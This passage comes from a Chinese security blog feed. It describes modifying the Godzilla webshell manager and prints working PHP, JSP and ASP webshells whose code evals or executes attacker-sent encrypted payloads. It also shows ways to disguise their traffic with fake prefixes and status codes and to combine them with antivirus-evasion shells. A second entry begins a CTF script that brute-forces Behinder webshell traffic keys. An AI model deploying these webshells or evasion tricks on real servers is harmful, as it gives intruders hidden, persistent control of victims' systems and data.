class="keyword">isset</span>(<span class="variable">$_SESSION</span><span class="comment">/*dbappsecurityJrZYGpRm*/</span>[<span class="variable">$qianxinuMq5P9IAtT1AwU</span>]))&#123;</span><br><span class="line">        <span class="variable">$qianxinqN</span>=qianxingCgkD21wHn(<span class="variable">$_SESSION</span><span class="comment">/*dbappsecurityqdVXl3Fu4*/</span>[<span class="variable">$qianxinuMq5P9IAtT1AwU</span>],<span class="variable">$qianxin1B</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="comment">/*dbappsecurityZIDeNEw*/</span>strpos(<span class="variable">$qianxinqN</span>,<span class="variable">$qianxinITUfjjXmxo2</span><span class="comment">/*dbappsecuritySC9ERptWGKU*/</span>(<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="string">&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;</span>)))===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$qianxinqN</span>=qianxingCgkD21wHn<span class="comment">/*dbappsecurityt9vgwbR6Nu*/</span>(<span class="variable">$qianxinqN</span>,<span class="variable">$qianxin1B</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                define(<span class="string">&quot;qianxinhRs0Ff&quot;</span>,<span class="string">&quot;//qianxinUJEoZGk\r\n&quot;</span>.<span class="variable">$qianxinqN</span>);</span><br><span class="line">                <span class="keyword">eval</span>(qianxinhRs0Ff);</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$base64_qianxingCgkD21wHn</span>(qianxingCgkD21wHn(@run(<span class="variable">$datqianxin7mlwRjVMRy1A</span>),<span class="variable">$qianxin1B</span>));</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos<span class="comment">/*dbappsecurityGS4ujb8wCNv1LjR*/</span>(<span class="variable">$datqianxin7mlwRjVMRy1A</span>,<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="variable">$qianxinITUfjjXmxo2</span>(<span class="string">&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;</span>)))!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$qianxinuMq5P9IAtT1AwU</span>]=qianxingCgkD21wHn(<span class="variable">$datqianxin7mlwRjVMRy1A</span>,<span class="variable">$qianxin1B</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918181736832.png" alt="image-20240918181736832"></p><p>换成我们的代码，中间key和pass替换一下。</p><p>生成好的php代码即可直接使用。</p><p>这里注意一下，如果我们改xorbase的代码，添加的那个文件要扣xorbase64的代码，要不然eval代码用xorbase64的payload肯定用不了。</p><p>笔者这里研究xorraw,没研究明白，只是研究了一丢丢</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240920180815804.png" alt="image-20240920180815804"></p><p>我们这里看下xor的流量加上message，是不是感觉有点突兀，因为它本身就是xor的乱码，如果我们在加message感觉有点怪怪的。这里就不加了。（其实是没研究明白，等我在学学）</p><h5 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h5><p>好接下来我们看jsp的，godzilla默认java的有两种载荷，一种aes-base64,一种是aes-raw，和php一样，不过php是先xor，可能是php默认开启ssl哪个函数的话，用对称加密吧，java默认有aes，那么就可以直接用了，就通用了。</p><p>jsp默认 java-aes-base64<br>&lt;%! String xc=”3c6e0b8a9c15224a”; String pass=”pass”; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(“AES”);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),”AES”));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(“MD5”);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(“java.util.Base64”);Object Encoder = base64.getMethod(“getEncoder”, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(“encodeToString”, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(“sun.misc.BASE64Encoder”); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(“encode”, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(“java.util.Base64”);Object decoder = base64.getMethod(“getDecoder”, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(“decode”, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(“sun.misc.BASE64Decoder”); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(“decodeBuffer”, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%&gt;&lt;%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(“payload”)==null){session.setAttribute(“payload”,new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(“parameters”,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(“payload”)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}<br>%&gt;</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241009175840339.png" alt="image-20241009175840339"></p><p>默认aes流量，这里由于全局设置了前后缀，就直接带了，下面返回包，和phpbase64一样</p><img src="/images/哥斯拉二开从0到1/image-20241009180000918.png" alt="image-20241009180000918"  /><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241009181920050.png" alt="image-20241009181920050"></p><p>我们先改一下代码。依旧替换一下左右信息</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174148624.png" alt="image-20241010174148624"></p><p>然后我们在写两个变量，把前后的md5替换掉就好了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174432335.png" alt="image-20241010174432335"></p><p>这样就好看一点了，然后我们也把jsp的返回响应包写里面</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241010174630597.png" alt="image-20241010174630597"></p><p>好，写好之后，我们来看一下。404.</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174236574.png" alt="image-20241011174236574"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174043037.png" alt="image-20241011174043037"></p><p>没有任何问题，好，接下来，我们看怎么生成的码。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011173910400.png" alt="image-20241011173910400"></p><p>从新在generate里面写一个方法，原来的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public byte[] generate(String password, String secretKey) &#123;</span><br><span class="line">    return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们新写一个方法</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174428716.png" alt="image-20241011174428716"></p><p>然后去到generate文件，copy一个方法，然后加个messsage</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174502165.png" alt="image-20241011174502165"></p><p>然后就是把bin文件写好，这里我直接用的大师傅的代码，回头咱们自己改</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174605083.png" alt="image-20241011174605083"></p><p>最后调用的方法写一下就好了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241011174704236.png" alt="image-20241011174704236"></p><p>ok，这样就可以直接生成了，测试没啥问题。</p><p>我用其他大师傅的二开的，好多都不能生成原版的，这样比较简单生成我们自定义的了。</p><p>这里就不该aesraw的了。跟上面原因一样，不好看。（其实就是笔者没研究明白）</p><h5 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h5><p>ASP是Active Server Page的缩写，意为“活动服务器网页”。是MicroSoft公司开发的服务器端脚本环境，是一个WEB服务器端的开发环境，利用它可以产生和执行动态的、互动的、高性能的WEB服务应用程序。ASP采用脚本语言VBScript（Javascript）作为自己的开发语言。常用于各种动态网站中。 ASP是一种服务器端脚本编写环境，可以用来创建和运行动态网页或web应用程序。ASP的网页文件的格式是.asp。</p><p>asp的我们选用<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012102901818.png" alt="image-20241012102901818"></p><p>asp xor base64的改一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012103024676.png" alt="image-20241012103024676"></p><p>这是我们的原始流量，长得和上面的差不多，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Set bypassDictionary = Server.CreateObject(&quot;Scripting.Dictionary&quot;)</span><br><span class="line"></span><br><span class="line">Function Base64Decode(ByVal vCode)</span><br><span class="line">    Dim oXML, oNode</span><br><span class="line">    Set oXML = CreateObject(&quot;Msxml2.DOMDocument.3.0&quot;)</span><br><span class="line">    Set oNode = oXML.CreateElement(&quot;base64&quot;)</span><br><span class="line">    oNode.dataType = &quot;bin.base64&quot;</span><br><span class="line">    oNode.text = vCode</span><br><span class="line">    Base64Decode = oNode.nodeTypedValue</span><br><span class="line">    Set oNode = Nothing</span><br><span class="line">    Set oXML = Nothing</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function decryption(content,isBin)</span><br><span class="line">    dim size,i,result,keySize</span><br><span class="line">    keySize = len(key)</span><br><span class="line">    Set BinaryStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">    BinaryStream.CharSet = &quot;iso-8859-1&quot;</span><br><span class="line">    BinaryStream.Type = 2</span><br><span class="line">    BinaryStream.Open</span><br><span class="line">    if IsArray(content) then</span><br><span class="line">        size=UBound(content)+1</span><br><span class="line">        For i=1 To size</span><br><span class="line">            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))</span><br><span class="line">        Next</span><br><span class="line">    end if</span><br><span class="line">    BinaryStream.Position = 0</span><br><span class="line">    if isBin then</span><br><span class="line">        BinaryStream.Type = 1</span><br><span class="line">        decryption=BinaryStream.Read()</span><br><span class="line">    else</span><br><span class="line">        decryption=BinaryStream.ReadText()</span><br><span class="line">    end if</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line">    key=&quot;3c6e0b8a9c15224a&quot;</span><br><span class="line">    content=request.Form(&quot;pass&quot;)</span><br><span class="line">    if not IsEmpty(content) then</span><br><span class="line"></span><br><span class="line">        if  IsEmpty(Session(&quot;payload&quot;)) then</span><br><span class="line">            content=decryption(Base64Decode(content),false)</span><br><span class="line">            Session(&quot;payload&quot;)=content</span><br><span class="line">            response.End</span><br><span class="line">        else</span><br><span class="line">            content=decryption(Base64Decode(content),true)</span><br><span class="line">            bypassDictionary.Add &quot;payload&quot;,Session(&quot;payload&quot;)</span><br><span class="line">            Execute(bypassDictionary(&quot;payload&quot;))</span><br><span class="line">            result=run(content)</span><br><span class="line">            response.Write(&quot;11cd6a&quot;)</span><br><span class="line">            if not IsEmpty(result) then</span><br><span class="line">                response.Write Base64Encode(decryption(result,true))</span><br><span class="line">            end if</span><br><span class="line">            response.Write(&quot;ac826a&quot;)</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到  最后输出了两个字符串</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012104746955.png" alt="image-20241012104746955"></p><p>源payload中也是匹配前六和后六，那么我们顺着他的改一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171426760.png" alt="image-20241012171426760"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171446561.png" alt="image-20241012171446561"></p><p>原版代码改一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241012171504578.png" alt="image-20241012171504578"></p><p>非常ok。我们来改一下回显状态码。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112100654131.png" alt="image-20241112100654131"></p><p>asp的话  我们加这一句话即可</p><p>Response.Status = “500 Internal Server Error”</p><p>就会强制改回显状态码，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112100816345-17313772966692.png" alt="image-20241112100816345"></p><p>蔽日这里改成a，我们就会强制加个状态码</p><p>如果改成404，那么这个文件就不可以使用了</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104047871.png" alt="image-20241112104047871"></p><p>直接就会报错，设置成302就不会报错了，也可以用，但是吧  仔细看的话，感觉有点问题</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104124569.png" alt="image-20241112104124569"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112104316247.png" alt="image-20241112104316247"></p><p>当然，你可以加一些你喜欢的字符。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112105056867.png" alt="image-20241112105056867"></p><p>好，然后我们用大师傅的免杀，缝合一下。</p><p>只需要将生成的马改下格式，然后放在template下即可</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112164410940.png" alt="image-20241112164410940"></p><p>此时就能生成了。</p><p>生成一个，试一下，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241112164520622.png" alt="image-20241112164520622"></p><p>301伪装，emmm，还行吧。asp的先这样。</p><h5 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h5><p>接下来时aspx的</p><p>其实流程都一样了，这次我们换个单词，就用常见的data吧</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113164145932.png" alt="image-20241113164145932"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113164158602.png" alt="image-20241113164158602"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102937132.png" alt="image-20241114102937132"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241113165224132.png" alt="image-20241113165224132"></p><p>至此，简单的二开哥斯拉就完成了，其实也没有改什么，就只是加了前后缀，并且有一些加密类型也没有做更改，只是自己学习一下，简单记录一下。</p><p>如果大哥们有自己的免杀马，但是还用俺这个类型的，那么只需要在木马前后输出的地方改成data这种形式就可以了。</p><h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>这里只是改了一丢丢，并没有改流量以及加密方式，只是做了伪装，下个版本我们修改一下加密方式，这样的话会更好一点。而且是抄的其他大师傅的免杀🐎，下回争取的做一下免杀。还有就是message其实是固定的，希望能让他动起来。</p><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><p><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            原版哥斯拉</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzkxNTUwNjgxOQ==&amp;mid=2247484153&amp;idx=1&amp;sn=67d8b3932714ff0a0ee5745f7049a661&amp;scene=21#wechat_redirect    哥斯拉webshell管理工具二开小记</span><br><span class="line">https://github.com/Tas9er/ByPassGodzilla   ByPassGodzilla</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla、二开 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种脚本</title>
      <link href="/2024/04/29/%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC/"/>
      <url>/2024/04/29/%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h5 id="冰蝎4-爆破"><a href="#冰蝎4-爆破" class="headerlink" title="冰蝎4,爆破"></a>冰蝎4,爆破</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_aes_ecb</span>(<span class="params">ciphertext, key</span>):</span></span><br><span class="line">    cipher = AES.new(key.encode(), AES.MODE_ECB)</span><br><span class="line">    decrypted_bytes = cipher.decrypt(base64.b64decode(ciphertext))</span><br><span class="line">    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_from_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_key_from_file</span>(<span class="params">key_path</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(key_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> key_file:</span><br><span class="line">        keys = key_file.read().splitlines()</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 从文件中读取密文和密钥</span></span><br><span class="line">    ciphertext_path = <span class="string">&quot;D:\\vscodework\\ctf\\5space\\cip.txt&quot;</span>  <span class="comment"># 替换为实际的文件路径</span></span><br><span class="line">    key_path = <span class="string">&quot;D:\\vscodework\\ctf\\5space\\pass.txt&quot;</span>  <span class="comment"># 替换为实际的密钥文件路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ciphertext = read_from_file(ciphertext_path)</span><br><span class="line">    <span class="comment">#print(ciphertext)</span></span><br><span class="line">    ciphertext = read_from_file(ciphertext_path)</span><br><span class="line">    keys = read_key_from_file(key_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># keys = read_key_from_file(key_path)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    decryption_success = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">#尝试每个密钥进行解密</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            mima = key.strip()</span><br><span class="line">            key = hashlib.md5(mima.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">            key = key[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">            decrypted_text = decrypt_aes_ecb(ciphertext, key)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Decrypted Text with Key <span class="subst">&#123;key&#125;</span>:<span class="subst">&#123;mima&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(decrypted_text)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> decrypted_text:</span><br><span class="line">                decryption_success = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Decryption successful. Stopping further attempts.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 解密成功并包含&quot;success&quot;，停止尝试其他密钥</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Decryption with Key <span class="subst">&#123;key&#125;</span> failed: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> decryption_success:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decryption unsuccessful with all keys.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># wireshark</span></span><br><span class="line"><span class="comment">#$mode=&quot;ZG93bmxvYWRQYXJ0&quot;;$mode=base64_decode($mode);$path=&quot;QzovVXNlcnMvQWRtaW5pc3RyYXRvci9EZXNrdG9wL3Byb2plY3RzL3Byb2plY3Quemlw&quot;;$path=base64_decode($path);$hash=&quot;&quot;;$blockIndex=&quot;MA==&quot;;$blockIndex=base64_decode($blockIndex);$blockSize=&quot;MTA0ODU3Ng==&quot;;$blockSize=base64_decode($blockSize);$content=&quot;&quot;;$charset=&quot;&quot;;$newpath=&quot;&quot;;$createTimeStamp=&quot;&quot;;$accessTimeStamp=&quot;&quot;;$modifyTimeStamp=&quot;&quot;;</span></span><br><span class="line"><span class="comment">#main($mode,$path,$hash,$blockIndex,$blockSize,$content,$charset,$newpath,$createTimeStamp,$accessTimeStamp,$modifyTimeStamp);&#x27;</span></span><br></pre></td></tr></table></figure><p>解文件名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_json</span>(<span class="params">input_json</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解析 JSON 输入</span></span><br><span class="line">        json_data = json.loads(input_json)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对每个对象的值进行 Base64 解码</span></span><br><span class="line">        decoded_json = []</span><br><span class="line">        <span class="keyword">for</span> obj <span class="keyword">in</span> json_data:</span><br><span class="line">            decoded_obj = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> obj.items():</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">str</span>):</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        decoded_value = base64.b64decode(value).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        decoded_obj[key] = decoded_value</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="comment"># 如果解码失败，则保留原始值</span></span><br><span class="line">                        decoded_obj[key] = value</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    decoded_obj[key] = value</span><br><span class="line">            